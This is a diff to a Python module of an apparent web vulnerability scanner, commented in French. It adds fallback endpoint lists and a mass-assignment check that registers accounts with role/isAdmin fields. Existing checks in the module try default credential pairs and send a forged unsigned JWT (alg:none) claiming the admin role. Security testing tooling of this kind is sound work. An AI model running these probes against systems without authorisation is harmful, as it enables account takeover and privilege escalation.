@@ -1,12 +1,14 @@
 """Authentification cassée : identifiants par défaut sur les endpoints de
-login découverts, et JWT `alg:none` accepté par un endpoint protégé."""
+login découverts, JWT `alg:none` accepté par un endpoint protégé, et
+élévation de privilège par assignation de masse (role/isAdmin à l'inscription).
+"""
 from __future__ import annotations
 
 import base64
 import json
 
 from ..scan_models import Finding
-from ._util import iter_login_targets
+from ._util import merged_login_targets
 
 DEFAULT_CREDS = [
     ("admin", "admin"), ("admin", "password"), ("admin", "admin123"),
@@ -16,9 +18,18 @@ DEFAULT_CREDS = [
 
 PROTECTED_HINTS = ("me", "profile", "whoami", "account", "user")
 
+# Repli intégré (issu de `techniques.py`) : sondé même sans rien découvert
+# par le crawl (SPA peu explorable).
+LOGIN_ENDPOINTS = ["/rest/user/login", "/api/login", "/api/auth/login",
+                   "/login", "/api/users/login", "/auth/login", "/session"]
+PROTECTED_ENDPOINTS = ["/rest/user/whoami", "/api/me", "/api/profile"]
+MASS_ASSIGNMENT_ENDPOINTS = ["/api/Users", "/api/users", "/api/register",
+                             "/register", "/users"]
+
 
 def t_default_credentials(ctx) -> list[Finding]:
-    for action, _fields in iter_login_targets(ctx.sitemap):
+    targets = merged_login_targets(ctx.sitemap, ctx.origin, LOGIN_ENDPOINTS)
+    for action, _fields in targets:
         ref, _, _ = ctx.safe_post(action, data={"email": "nobody@nope.tld", "password": "x"})
         if ref in (-1, 404):
             continue
@@ -42,10 +53,12 @@ def t_jwt_none_alg(ctx) -> list[Finding]:
     payload = _b64url(json.dumps({"data": {"email": "pentaster@none.tld"},
                                   "role": "admin", "iat": 0}).encode())
     token = f"{header}.{payload}."
-    targets = [ep.url for ep in list(ctx.sitemap.endpoints) + list(ctx.sitemap.api_endpoints)]
+    discovered = [ep.url for ep in list(ctx.sitemap.endpoints) + list(ctx.sitemap.api_endpoints)
+                 if any(h in ep.url.lower() for h in PROTECTED_HINTS)]
+    base = ctx.origin.rstrip("/")
+    builtin = [base + ep for ep in PROTECTED_ENDPOINTS]
+    targets = list(dict.fromkeys(discovered + builtin))  # dédupliqué, ordre préservé
     for url in targets:
-        if not any(h in url.lower() for h in PROTECTED_HINTS):
-            continue
         st, _, body = ctx.safe_get(url, headers={"Authorization": f"Bearer {token}",
                                                   "Cookie": f"token={token}"})
         if st == 200 and ("none.tld" in (body or "") or "email" in (body or "").lower()):
@@ -55,7 +68,26 @@ def t_jwt_none_alg(ctx) -> list[Finding]:
     return []
 
 
+def t_mass_assignment(ctx) -> list[Finding]:
+    """Élévation de privilège via champ role/isAdmin à l'inscription (repli
+    intégré, issu de `techniques.py`) : sondé sur les endpoints de
+    (dés)inscription courants, indépendamment du crawl."""
+    email = f"pentaster_ma_{abs(hash(ctx.origin)) % 99999}@probe.tld"
+    for ep in MASS_ASSIGNMENT_ENDPOINTS:
+        st, _, body = ctx.safe_post(ep, data={"email": email, "password": "Passw0rd!1",
+                                              "passwordRepeat": "Passw0rd!1",
+                                              "role": "admin", "isAdmin": True})
+        low = (body or "").lower().replace(" ", "")
+        if st in (200, 201) and ('"role":"admin"' in low or '"isadmin":true' in low):
+            return [Finding("auth", "mass-assignment-privilege-escalation", "high",
+                            ctx.origin.rstrip("/") + ep,
+                            "Le champ privilégié (role/isAdmin) a été accepté à l'inscription",
+                            request=f"POST {ep}")]
+    return []
+
+
 ATTACKS = [
     ("auth", "Default credentials", t_default_credentials),
     ("auth", "JWT alg:none", t_jwt_none_alg),
+    ("auth", "Mass assignment (priv-esc)", t_mass_assignment),
 ]
